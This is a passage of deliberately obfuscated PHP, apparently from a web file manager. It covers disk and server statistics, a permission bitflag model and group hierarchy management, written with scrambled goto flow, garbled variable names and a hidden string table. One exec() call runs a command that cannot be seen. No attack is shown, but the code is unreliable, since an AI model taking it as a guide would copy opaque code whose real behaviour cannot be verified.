$fÙàâõ´ÿ‡[134] => $this->typeLogCnt($fÙàâõ´ÿ‡[134]), $fÙàâõ´ÿ‡[1484] => $this->typeLogCnt($fÙàâõ´ÿ‡[1484]), $fÙàâõ´ÿ‡[368] => $this->typeLogCnt($fÙàâõ´ÿ‡[368]), $fÙàâõ´ÿ‡[1485] => $this->typeLogCnt($fÙàâõ´ÿ‡[1485]), $fÙàâõ´ÿ‡[415] => $this->typeLogCnt($fÙàâõ´ÿ‡[33], $fÙàâõ´ÿ‡[1458])); } private function typeLogCnt($eª∑Æ•≈ÈÉ = '', $c∂¶ïøÀÇœ = "\x69\x64") { goto C©≈õïÑª„; d®÷ÆÒáê¡: $eÇÁÙö¶ΩÔ = array($fŸíáï±ì•[183] => array($fŸíáï±ì•[688], $aÀ™º≠Û¨)); if ($eª∑Æ•≈ÈÉ) { $eÇÁÙö¶ΩÔ[$fŸíáï±ì•[29]] = array($fŸíáï±ì•[7], $b¿∫Ì∞†‰∏[$eª∑Æ•≈ÈÉ]); } $AÀæ±‡á°∂ = Model($fŸíáï±ì•[1457])->where($eÇÁÙö¶ΩÔ)->count($c∂¶ïøÀÇœ); goto Cé´¶‘¯◊Ë; Cé´¶‘¯◊Ë: return (int) $AÀæ±‡á°∂; goto fëÛ§“„ÿ€; C©≈õïÑª„: $fŸíáï±ì• =& $_SERVER[∞„˜ƒÑºª]; $b¿∫Ì∞†‰∏ = array($fŸíáï±ì•[134] => array($fŸíáï±ì•[1486], $fŸíáï±ì•[1487]), $fŸíáï±ì•[1484] => array($fŸíáï±ì•[1488]), $fŸíáï±ì•[368] => array($fŸíáï±ì•[1489], $fŸíáï±ì•[1490]), $fŸíáï±ì•[1485] => array($fŸíáï±ì•[1491], $fŸíáï±ì•[1492]), $fŸíáï±ì•[1493] => array($fŸíáï±ì•[1494], $fŸíáï±ì•[1495], $fŸíáï±ì•[1496])); $aÀ™º≠Û¨ = strtotime(date($fŸíáï±ì•[1454])); goto d®÷ÆÒáê¡; fëÛ§“„ÿ€: } private function optionServer() { goto aêÊÂƒ≠©‰; e£Œ£ﬁ°”ß: $bâæê¬£·Æ = array($FΩïÊæÕßÂ[479] => $Dﬂ∞‹ß±Ìì[$FΩïÊæÕßÂ[366]]); $DÈ†æá¢çÑ = Model($FΩïÊæÕßÂ[1459])->where($bâæê¬£·Æ)->sum($FΩïÊæÕßÂ[86]); $Bƒñê«ëÿ¢ = explode($FΩïÊæÕßÂ[50], $_SERVER[$FΩïÊæÕßÂ[137]]); goto Füﬂœ∆¯·å; fçëÚŒÂ⁄°: if ($EΩ®Ωµ˘°Ø == $FΩïÊæÕßÂ[490]) { $cÒÇæô≥ôƒ = explode($FΩïÊæÕßÂ[491], $bÁ≥ÃìÀÂÍ[$FΩïÊæÕßÂ[492]]); $EΩ®Ωµ˘°Ø = $cÒÇæô≥ôƒ[0]; } if ($EΩ®Ωµ˘°Ø == $FΩïÊæÕßÂ[584] || $EΩ®Ωµ˘°Ø == $FΩïÊæÕßÂ[472]) { $EÜ˜”Óâê = Model()->db()->query($FΩïÊæÕßÂ[1497]); $AΩäßœàØ∑ = $EÜ˜”Óâê[0] && isset($EÜ˜”Óâê[0][$FΩïÊæÕßÂ[972]]) ? $EÜ˜”Óâê[0][$FΩïÊæÕßÂ[972]] : 0; $EΩ®Ωµ˘°Ø = $FΩïÊæÕßÂ[1498] . ($AΩäßœàØ∑ ? $FΩïÊæÕßÂ[8] . $AΩäßœàØ∑ : $FΩïÊæÕßÂ[33]); } $DÁÓÎôƒ”• = $GLOBALS[$FΩïÊæÕßÂ[6]][$FΩïÊæÕßÂ[336]][$FΩïÊæÕßÂ[521]]; goto e∫ÏÆÌ†îã; Füﬂœ∆¯·å: $dä»—ôü†∏ = $Bƒñê«ëÿ¢[0]; $bÁ≥ÃìÀÂÍ = $GLOBALS[$FΩïÊæÕßÂ[6]][$FΩïÊæÕßÂ[17]]; $EΩ®Ωµ˘°Ø = $bÁ≥ÃìÀÂÍ[$FΩïÊæÕßÂ[489]]; goto fçëÚŒÂ⁄°; aêÊÂƒ≠©‰: $FΩïÊæÕßÂ =& $_SERVER[∞„˜ƒÑºª]; $e–éº≥êÑÃ = $this->diskDriver(); $Dﬂ∞‹ß±Ìì = KodIO::defaultDriver(); goto e£Œ£ﬁ°”ß; e∫ÏÆÌ†îã: return array($FΩïÊæÕßÂ[1499] => $e–éº≥êÑÃ ? $e–éº≥êÑÃ[$FΩïÊæÕßÂ[1500]] : 0, $FΩïÊæÕßÂ[1501] => $e–éº≥êÑÃ ? $e–éº≥êÑÃ[$FΩïÊæÕßÂ[1502]] : 0, $FΩïÊæÕßÂ[1503] => (int) $Dﬂ∞‹ß±Ìì[$FΩïÊæÕßÂ[1500]] * 1024 * 1024 * 1024, $FΩïÊæÕßÂ[1504] => (int) $DÈ†æá¢çÑ, $FΩïÊæÕßÂ[1505] => ucfirst($dä»—ôü†∏), $FΩïÊæÕßÂ[1506] => $FΩïÊæÕßÂ[1507] . PHP_VERSION, $FΩïÊæÕßÂ[1508] => phpBuild64() ? 64 : 32, $FΩïÊæÕßÂ[450] => str_replace($FΩïÊæÕßÂ[1509], $FΩïÊæÕßÂ[664], $EΩ®Ωµ˘°Ø), $FΩïÊæÕßÂ[336] => ucfirst($DÁÓÎôƒ”•), $FΩïÊæÕßÂ[28] => $_SERVER[$FΩïÊæÕßÂ[1510]]); goto eÎ»ˆ∂≤åﬂ; eÎ»ˆ∂≤åﬂ: } private function diskDriver() { goto C⁄íË¡ß«≈; C⁄íË¡ß«≈: $D±‡´ìÏÉû =& $_SERVER[∞„˜ƒÑºª]; $C¡æùÉµâõ = $D±‡´ìÏÉû[8]; $F∂Öº’è›† = $GLOBALS[$D±‡´ìÏÉû[6]][$D±‡´ìÏÉû[1511]] == $D±‡´ìÏÉû[1512]; goto C≤·Æ·çÁﬂ; E∑Ωá÷⁄ƒ≥: $Dò°≠·≥Øâ = $DéÒ¡‡Á»Ï - @disk_free_space($C¡æùÉµâõ); return array($D±‡´ìÏÉû[1500] => $DéÒ¡‡Á»Ï, $D±‡´ìÏÉû[1502] => $Dò°≠·≥Øâ); goto A¶πı€£ûΩ; C≤·Æ·çÁﬂ: if ($F∂Öº’è›†) { $C¡æùÉµâõ = $D±‡´ìÏÉû[1513]; if (function_exists($D±‡´ìÏÉû[1514])) { exec($D±‡´ìÏÉû[1515], $BΩ≈ÉÊÉ·‡); $C¡æùÉµâõ = $BΩ≈ÉÊÉ·‡[1] . $D±‡´ìÏÉû[8]; } } if (!file_exists($C¡æùÉµâõ)) { return; } $DéÒ¡‡Á»Ï = @disk_total_space($C¡æùÉµâõ); goto E∑Ωá÷⁄ƒ≥; A¶πı€£ûΩ: } public function fileChart($CÜŒ‹ìä≈ ) { goto Dí•˘˜”∆Í; Dí•˘˜”∆Í: $E£èçûÚù∫ =& $_SERVER[∞„˜ƒÑºª]; if (isset($CÜŒ‹ìä≈ [$E£èçûÚù∫[1063]])) { return Model($E£èçûÚù∫[520])->userFileTypeProfile($CÜŒ‹ìä≈ [$E£èçûÚù∫[1063]]); } if (isset($CÜŒ‹ìä≈ [$E£èçûÚù∫[1516]])) { return Model($E£èçûÚù∫[520])->groupFileTypeProfile($CÜŒ‹ìä≈ [$E£èçûÚù∫[1516]]); } goto c∂Ê‚ˆÏü≈; c∂Ê‚ˆÏü≈: $AëÜ≈¿ÏﬂΩ = $this->sourceSize(); $eÑ€∫ß°îã = array($E£èçûÚù∫[384] => 0, $E£èçûÚù∫[393] => 1); $BÀ◊ˆ¡Ø≤≠ = Model($E£èçûÚù∫[520])->where($eÑ€∫ß°îã)->sum($E£èçûÚù∫[86]); goto D∏ö∫ı™ñØ; D∏ö∫ı™ñØ: $eÑ€∫ß°îã[$E£èçûÚù∫[393]] = 2; $EÑÿ‘ùáù´ = Model($E£èçûÚù∫[520])->where($eÑ€∫ß°îã)->sum($E£èçûÚù∫[86]); return array($E£èçûÚù∫[454] => $AëÜ≈¿ÏﬂΩ[$E£èçûÚù∫[86]], $E£èçûÚù∫[1446] => $AëÜ≈¿ÏﬂΩ[$E£èçûÚù∫[1446]], $E£èçûÚù∫[1447] => (int) $BÀ◊ˆ¡Ø≤≠, $E£èçûÚù∫[1448] => (int) $EÑÿ‘ùáù´); goto bÖÏóÉùèÖ; bÖÏóÉùèÖ: } private function sourceSize() { $CÑé‰æêÉ— =& $_SERVER[∞„˜ƒÑºª]; $E€≥€¥Ü≠Í = Model($CÑé‰æêÉ—[520])->where(array($CÑé‰æêÉ—[375] => 0))->sum($CÑé‰æêÉ—[86]); $dÑÁîåêΩç = Model($CÑé‰æêÉ—[1459])->sum($CÑé‰æêÉ—[86]); if ($dÑÁîåêΩç > $E€≥€¥Ü≠Í) { $dÑÁîåêΩç = $E€≥€¥Ü≠Í; } return array($CÑé‰æêÉ—[86] => (int) $E€≥€¥Ü≠Í, $CÑé‰æêÉ—[1446] => (int) $dÑÁîåêΩç); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $c√ìõÜÍ§ò =& $_SERVER[∞„˜ƒÑºª]; $C¥¨Œé£Ò‹ = array(array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1517]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1519], $c√ìõÜÍ§ò[1520] => 6, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1523]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1524], $c√ìõÜÍ§ò[1520] => 1, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1525]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1526], $c√ìõÜÍ§ò[1520] => 2, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1527]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1526], $c√ìõÜÍ§ò[1520] => 3, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1528]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1529], $c√ìõÜÍ§ò[1520] => 4, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => self::AUTH_SHOW | self::AUTH_VIEW), array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1530]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1531], $c√ìõÜÍ§ò[1520] => 5, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c√ìõÜÍ§ò[387] => LNG($c√ìõÜÍ§ò[1532]), $c√ìõÜÍ§ò[1518] => $c√ìõÜÍ§ò[1533], $c√ìõÜÍ§ò[1520] => 7, $c√ìõÜÍ§ò[1521] => 1, $c√ìõÜÍ§ò[1522] => 0)); return $C¥¨Œé£Ò‹; } public static function authCheck($DÁæ¶ÿ•Öò, $f™‰ÖŒ∑◊Õ) { $DÁæ¶ÿ•Öò = intval($DÁæ¶ÿ•Öò); if ($GLOBALS[$_SERVER[∞„˜ƒÑºª][998]]) { return !0; } if ($DÁæ¶ÿ•Öò <= 0) { return !1; } if (($DÁæ¶ÿ•Öò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($DÁæ¶ÿ•Öò & $f™‰ÖŒ∑◊Õ); } public static function authCheckShow($d ìûäªÔŒ) { return self::authCheck($d ìûäªÔŒ, self::AUTH_SHOW); } public static function authCheckView($EâˆåÖÒ£≥) { return self::authCheck($EâˆåÖÒ£≥, self::AUTH_VIEW); } public static function authCheckDownload($A∑éΩ§ñ—Ç) { return self::authCheck($A∑éΩ§ñ—Ç, self::AUTH_DOWNLOAD); } public static function authCheckUpload($AôóÜü£∫ë) { return self::authCheck($AôóÜü£∫ë, self::AUTH_UPLOAD); } public static function authCheckEdit($DÃŒ™ÈÓ–£) { return self::authCheck($DÃŒ™ÈÓ–£, self::AUTH_EDIT); } public static function authCheckRemove($Cê∑√Õπ∆Ÿ) { return self::authCheck($Cê∑√Õπ∆Ÿ, self::AUTH_REMOVE); } public static function authCheckShare($Eùè∑”‚‡Â) { return self::authCheck($Eùè∑”‚‡Â, self::AUTH_SHARE); } public static function authCheckComment($B≥Ñ˘ÂìçÃ) { return self::authCheck($B≥Ñ˘ÂìçÃ, self::AUTH_COMMENT); } public static function authCheckEvent($b»¨È€Ø∆µ) { return self::authCheck($b»¨È€Ø∆µ, self::AUTH_EVENT); } public static function authCheckRoot($e⁄§‡‰ÚÊ◊) { return self::authCheck($e⁄§‡‰ÚÊ◊, self::AUTH_ROOT); } public static function authDisable($E˘Ê¯êèŒ”, $A¬Ë¨©âÒ–) { if (intval($E˘Ê¯êèŒ”) <= 0) { return 0; } return intval($E˘Ê¯êèŒ”) & ~$A¬Ë¨©âÒ–; } public $optionType = "\x53\x79\x73\164\145\155\x2e\163\157\165\x72\143\x65\101\165\x74\150\114\151\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\141\165\164\x68", "\154\141\x62\145\154", "\x64\x69\x73\160\154\141\171", "\163\x79\163\164\x65\x6d", "\163\157\x72\x74"); public function initData() { $B√äººÑ–å = $this->authDefault(); foreach ($B√äººÑ–å as $Dõ⁄ΩåÀåè) { $this->add($Dõ⁄ΩåÀåè); } } public function listData($D⁄õé¥ÍÎƒ = false, $b≠®÷ù“ÜË = "\x73\x6f\162\164", $EŒä˘‡¢§Ë = false) { return parent::listData($D⁄õé¥ÍÎƒ, $b≠®÷ù“ÜË, $EŒä˘‡¢§Ë); } public function update($c¥ìÑ∞ëıê, $cÜºÔü”Û‚) { $FÖ∫≤ÛîÚ =& $_SERVER[∞„˜ƒÑºª]; $eÕŒ÷è´ßç = parent::listData($c¥ìÑ∞ëıê); $A÷¢é˜Öﬂ≠ = $this->findByName($cÜºÔü”Û‚[$FÖ∫≤ÛîÚ[28]]); if (!$eÕŒ÷è´ßç || $A÷¢é˜Öﬂ≠ && $A÷¢é˜Öﬂ≠[$FÖ∫≤ÛîÚ[366]] != $eÕŒ÷è´ßç[$FÖ∫≤ÛîÚ[366]]) { return !1; } $this->filterAuth($cÜºÔü”Û‚[$FÖ∫≤ÛîÚ[548]]); return parent::update($c¥ìÑ∞ëıê, $cÜºÔü”Û‚); } public function remove($b“íö…”◊™) { $e–å“â√Ÿà = parent::listData($b“íö…”◊™); if (!$e–å“â√Ÿà || $e–å“â√Ÿà[$_SERVER[∞„˜ƒÑºª][804]]) { return !1; } return parent::remove($b“íö…”◊™); } public function add($Cïõíê‡ÚË = array()) { goto f‚ÂÇ◊´ÖÖ; eÈô¡É‹≠ò: return parent::insert($Cïõíê‡ÚË); goto dêÈ¨ÛÚ≈ë; c≠˘í™Ü¡å: $Cïõíê‡ÚË = array_merge($eƒ⁄â√€éó, $Cïõíê‡ÚË); $Cïõíê‡ÚË[$Bèïáâõ≠π[1537]] = $this->getSort(); $this->filterAuth($Cïõíê‡ÚË[$Bèïáâõ≠π[548]]); goto eÈô¡É‹≠ò; f‚ÂÇ◊´ÖÖ: $Bèïáâõ≠π =& $_SERVER[∞„˜ƒÑºª]; if ($this->findByName($Cïõíê‡ÚË[$Bèïáâõ≠π[28]])) { return !1; } $eƒ⁄â√€éó = array($Bèïáâõ≠π[28] => $Bèïáâõ≠π[33], $Bèïáâõ≠π[548] => 1, $Bèïáâõ≠π[1534] => $Bèïáâõ≠π[1535], $Bèïáâõ≠π[1536] => 1, $Bèïáâõ≠π[804] => 0, $Bèïáâõ≠π[1537] => 0); goto c≠˘í™Ü¡å; dêÈ¨ÛÚ≈ë: } private function getSort() { $d¥†Â∆õæÖ =& $_SERVER[∞„˜ƒÑºª]; $b©˜—¡ùÍ = parent::listData(); $d¨⁄’ß¿¯ï = array_to_keyvalue($b©˜—¡ùÍ, $d¥†Â∆õæÖ[33], $d¥†Â∆õæÖ[1537]); return empty($d¨⁄’ß¿¯ï) ? 0 : max($d¨⁄’ß¿¯ï) + 1; } private function filterAuth(&$CÒ∏Œ·Àçå) { goto C˘«´—û¶ß; Aåﬁ≥ò¢ãÜ: foreach ($d≈î∏Ì’¿≠ as $A◊ıõãÃµ¬) { if (isset($CÿÌû®ôÔ∞[$A◊ıõãÃµ¬])) { $d≈î∏Ì’¿≠ = array_merge($d≈î∏Ì’¿≠, $CÿÌû®ôÔ∞[$A◊ıõãÃµ¬]); } } $d≈î∏Ì’¿≠[] = self::AUTH_SHOW; $CÒ∏Œ·Àçå = array_sum(array_unique($d≈î∏Ì’¿≠)); goto E‡∞ëååØ‰; C˘«´—û¶ß: if (!$CÒ∏Œ·Àçå) { return; } $e™ıÌä√âÁ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $d≈î∏Ì’¿≠ = array(); goto B∂Ù±›ÌΩÜ; B∂Ù±›ÌΩÜ: foreach ($e™ıÌä√âÁ as $A◊ıõãÃµ¬) { if ($CÒ∏Œ·Àçå & $A◊ıõãÃµ¬) { $d≈î∏Ì’¿≠[] = $A◊ıõãÃµ¬; } } if (in_array(self::AUTH_ROOT, $d≈î∏Ì’¿≠)) { $CÒ∏Œ·Àçå = array_sum($e™ıÌä√âÁ); return; } $CÿÌû®ôÔ∞ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Aåﬁ≥ò¢ãÜ; E‡∞ëååØ‰: } public function sort($Aÿ≥‚≠öñ∑, $cÖ©π‘·Êá) { return parent::update($Aÿ≥‚≠öñ∑, $cÖ©π‘·Êá); } } goto Eê≥†‹úú≠; BûÕÛıí‰÷: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\x65" => "\x67\162\x6f\165\x70\137\x6d\x65\x74\141", "\x6d\x65\164\x61\106\151\x65\154\x64" => "\x67\162\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($aö—‡ÇÆú°) { $FÏ£ËåÆœ¡ =& $_SERVER[∞„˜ƒÑºª]; return array($FÏ£ËåÆœ¡[1591] => array($aö—‡ÇÆú°[0], $FÏ£ËåÆœ¡[1592]), $FÏ£ËåÆœ¡[1593] => array($aö—‡ÇÆú°[0], $FÏ£ËåÆœ¡[1592])); } protected function getInfo($BÖ∏ÊºêÍî) { $cáè£‘ÖÊÈ = $this->getInfoSimple($BÖ∏ÊºêÍî); if (!$cáè£‘ÖÊÈ) { return !1; } return $this->_listDataApplyItem($cáè£‘ÖÊÈ); } protected function getInfoSimple($f∂ü›€ß∞÷, $a∏πÒÁÍô‹ = false) { $AÎâ¢‚ÉñÒ =& $_SERVER[∞„˜ƒÑºª]; if ($a∏πÒÁÍô‹) { $fÑ≈»œ›Æ∑ = array($AÎâ¢‚ÉñÒ[1516] => intval($f∂ü›€ß∞÷)); return $this->where($fÑ≈»œ›Æ∑)->find(); } return $this->cacheFunctionGet($AÎâ¢‚ÉñÒ[1594], $f∂ü›€ß∞÷); } protected function groupAdd($a„∑Ω”ŸñÕ) { goto AäöÌîÊ•º; bçäœ¬Í: if ($e∑ˆÏàÓ∑È[$aÛïìå‚äã[373]]) { $c¢„«¥ˆäÉ = $e∑ˆÏàÓ∑È[$aÛïìå‚äã[373]] . $e∑ˆÏàÓ∑È[$aÛïìå‚äã[1516]] . $aÛïìå‚äã[47]; } $eê‘Ÿ÷’Ø„ = array($aÛïìå‚äã[387] => $this->groupNameAuto($a„∑Ω”ŸñÕ[$aÛïìå‚äã[384]], $a„∑Ω”ŸñÕ[$aÛïìå‚äã[28]]), $aÛïìå‚äã[398] => $a„∑Ω”ŸñÕ[$aÛïìå‚äã[384]], $aÛïìå‚äã[399] => $c¢„«¥ˆäÉ, $aÛïìå‚äã[1596] => $a„∑Ω”ŸñÕ[$aÛïìå‚äã[1500]], $aÛïìå‚äã[1597] => 0, $aÛïìå‚äã[1520] => 0); if (!empty($a„∑Ω”ŸñÕ[$aÛïìå‚äã[1516]])) { $eê‘Ÿ÷’Ø„[$aÛïìå‚äã[1516]] = $a„∑Ω”ŸñÕ[$aÛïìå‚äã[1516]]; } goto d∂∞àïﬁóπ; AäöÌîÊ•º: $aÛïìå‚äã =& $_SERVER[∞„˜ƒÑºª]; if (!$a„∑Ω”ŸñÕ[$aÛïìå‚äã[384]] && isset($a„∑Ω”ŸñÕ[$aÛïìå‚äã[1516]]) && $a„∑Ω”ŸñÕ[$aÛïìå‚äã[1516]] == 1) { if ($e∑ˆÏàÓ∑È = $this->getInfoSimple($a„∑Ω”ŸñÕ[$aÛïìå‚äã[1516]], !0)) { return $a„∑Ω”ŸñÕ[$aÛïìå‚äã[1516]]; } } else { $e∑ˆÏàÓ∑È = $this->getInfoSimple($a„∑Ω”ŸñÕ[$aÛïìå‚äã[384]]); if (!$e∑ˆÏàÓ∑È) { return !1; } } $c¢„«¥ˆäÉ = $aÛïìå‚äã[1595]; goto bçäœ¬Í; C≤¿ƒŒà“°: return $Dô†ÑŒüôΩ; goto Fˆ∑‚âÏ÷°; d∂∞àïﬁóπ: $Dô†ÑŒüôΩ = $this->add($eê‘Ÿ÷’Ø„); $this->setNamePinyin($Dô†ÑŒüôΩ, $eê‘Ÿ÷’Ø„[$aÛïìå‚äã[28]]); Model($aÛïìå‚äã[832])->groupRootAdd($Dô†ÑŒüôΩ); goto C≤¿ƒŒà“°; Fˆ∑‚âÏ÷°: } protected function groupEdit($BëôÌ¡È≥, $B›Ôùæ»ÖÁ) { $f’®ÃôÇÖ∂ =& $_SERVER[∞„˜ƒÑºª]; if (!empty($B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[384]])) { $bØû¯œ”Ÿô = $this->getInfoSimple($BëôÌ¡È≥); $c◊æúØëûı = $this->getInfoSimple($B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[384]]); if (!$bØû¯œ”Ÿô || !$c◊æúØëûı) { return !1; } if ($B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[384]] != $bØû¯œ”Ÿô[$f’®ÃôÇÖ∂[384]]) { if ($c◊æúØëûı[$f’®ÃôÇÖ∂[373]] !== $bØû¯œ”Ÿô[$f’®ÃôÇÖ∂[373]] && strpos($c◊æúØëûı[$f’®ÃôÇÖ∂[373]], $bØû¯œ”Ÿô[$f’®ÃôÇÖ∂[373]]) === 0) { return !1; } $B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[399]] = $c◊æúØëûı[$f’®ÃôÇÖ∂[373]] . $B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[384]] . $f’®ÃôÇÖ∂[47]; $this->_changeChildLevel($bØû¯œ”Ÿô, $c◊æúØëûı); } } if (isset($B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[28]])) { $this->setNamePinyin($BëôÌ¡È≥, $B›Ôùæ»ÖÁ[$f’®ÃôÇÖ∂[28]]); } return $this->where(array($f’®ÃôÇÖ∂[1598] => $BëôÌ¡È≥))->save($B›Ôùæ»ÖÁ); } private function _changeChildLevel($D£”Ô°Ù°¯, $d≤÷ÊÙà◊Ñ, $C±äÛÌÉ™Ç = false) { goto BËôã¡÷º∑; bÁÜô—ıÿ¢: if ($C±äÛÌÉ™Ç) { $E‚°…ÚÛÛè = $d≤÷ÊÙà◊Ñ[$aÆ°¡”ñ÷Ø[373]] . $d≤÷ÊÙà◊Ñ[$aÆ°¡”ñ÷Ø[1516]] . $aÆ°¡”ñ÷Ø[47]; } $Eâ˘¥¢ËÑå = array($aÆ°¡”ñ÷Ø[399] => array($aÆ°¡”ñ÷Ø[408], $D£”Ô°Ù°¯[$aÆ°¡”ñ÷Ø[373]] . $D£”Ô°Ù°¯[$aÆ°¡”ñ÷Ø[1516]] . $aÆ°¡”ñ÷Ø[409])); $aÎß¢ÛçÙë = array($aÆ°¡”ñ÷Ø[399] => array($aÆ°¡”ñ÷Ø[413], "\162\x65\x70\154\141\x63\x65\x28\x70\141\x72\145\156\x74\x4c\x65\166\145\x6c\x2c\47{$B„√’Î∫ßØ}\x27\54\47{$E‚°…ÚÛÛè}\47\x29")); goto Aﬁ´’ÇÚØı; BËôã¡÷º∑: $aÆ°¡”ñ÷Ø =& $_SERVER[∞„˜ƒÑºª]; $B„√’Î∫ßØ = $D£”Ô°Ù°¯[$aÆ°¡”ñ÷Ø[373]] . $D£”Ô°Ù°¯[$aÆ°¡”ñ÷Ø[1516]] . $aÆ°¡”ñ÷Ø[47]; $E‚°…ÚÛÛè = $d≤÷ÊÙà◊Ñ[$aÆ°¡”ñ÷Ø[373]] . $d≤÷ÊÙà◊Ñ[$aÆ°¡”ñ÷Ø[1516]] . $aÆ°¡”ñ÷Ø[47] . $D£”Ô°Ù°¯[$aÆ°¡”ñ÷Ø[1516]] . $aÆ°¡”ñ÷Ø[47]; goto bÁÜô—ıÿ¢; Aﬁ´’ÇÚØı: $this->where($Eâ˘¥¢ËÑå)->data($aÎß¢ÛçÙë)->save(); goto Bù˘æÌÍÔó; Bù˘æÌÍÔó: } public function setNamePinyin($D≠›‚‹Ÿ°∏, $aµƒì∏ä¡± = false) { $Eªπß≤°¡ô =& $_SERVER[∞„˜ƒÑºª]; if (!$aµƒì∏ä¡±) { $aÌ±®è£π≤ = $this->getInfoSimple($D≠›‚‹Ÿ°∏); $aµƒì∏ä¡± = $aÌ±®è£π≤[$Eªπß≤°¡ô[28]]; } if (!Input::check($aµƒì∏ä¡±, $Eªπß≤°¡ô[403])) { $this->metaSet($D≠›‚‹Ÿ°∏, $Eªπß≤°¡ô[404], null); $this->metaSet($D≠›‚‹Ÿ°∏, $Eªπß≤°¡ô[405], null); return; } $C é‰Ê™€∂ = array($Eªπß≤°¡ô[404] => str_replace($Eªπß≤°¡ô[50], $Eªπß≤°¡ô[33], Pinyin::encode($aµƒì∏ä¡±)), $Eªπß≤°¡ô[405] => Pinyin::encode($aµƒì∏ä¡±, $Eªπß≤°¡ô[406])); $this->metaSet($D≠›‚‹Ÿ°∏, $C é‰Ê™€∂); } protected function groupRemove($C∞∑⁄‡¥ò—) { goto aå∂ËŸ©∆≥; f∑Ù∏éÈÛπ: Model($E‡‹í”ƒ…[520])->groupRootRemove($C∞∑⁄‡¥ò—); return $this->where($E´ÂÁ∂À∞˜)->delete(); goto eêﬂäû˘êÆ; dÖ¯õÇ≠ê«: if (!$e¬¬†”ñ—Û || $e¬¬†”ñ—Û[$E‡‹í”ƒ…[384]] == 0) { return !1; } $Eâª∆´ÔÍ£ = $this->getInfoSimple($e¬¬†”ñ—Û[$E‡‹í”ƒ…[384]]); $this->_changeChildLevel($e¬¬†”ñ—Û, $Eâª∆´ÔÍ£, !0); goto AŸ¯êøë¶‚; aå∂ËŸ©∆≥: $E‡‹í”ƒ… =& $_SERVER[∞„˜ƒÑºª]; $E´ÂÁ∂À∞˜ = array($E‡‹í”ƒ…[1516] => $C∞∑⁄‡¥ò—); $e¬¬†”ñ—Û = $this->where($E´ÂÁ∂À∞˜)->find(); goto dÖ¯õÇ≠ê«; AŸ¯êøë¶‚: $this->where(array($E‡‹í”ƒ…[384] => $C∞∑⁄‡¥ò—))->save(array($E‡‹í”ƒ…[384] => $e¬¬†”ñ—Û[$E‡‹í”ƒ…[384]])); Model($E‡‹í”ƒ…[1599])->where($E´ÂÁ∂À∞˜)->delete(); Model($E‡‹í”ƒ…[1600])->where($E´ÂÁ∂À∞˜)->delete(); goto f∑Ù∏éÈÛπ; eêﬂäû˘êÆ: } public function listData() { $a˜ö´≈ﬁ¿µ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a˜ö´≈ﬁ¿µ[$_SERVER[∞„˜ƒÑºª][354]]); return $a˜ö´≈ﬁ¿µ; } private function _makeOrder($Eåè∞∏ÊÃ∑ = '') { goto CÍêÔÆÆ…∑; eÂ Ü”Çó™: $Eåè∞∏ÊÃ∑ = $Eåè∞∏ÊÃ∑ . 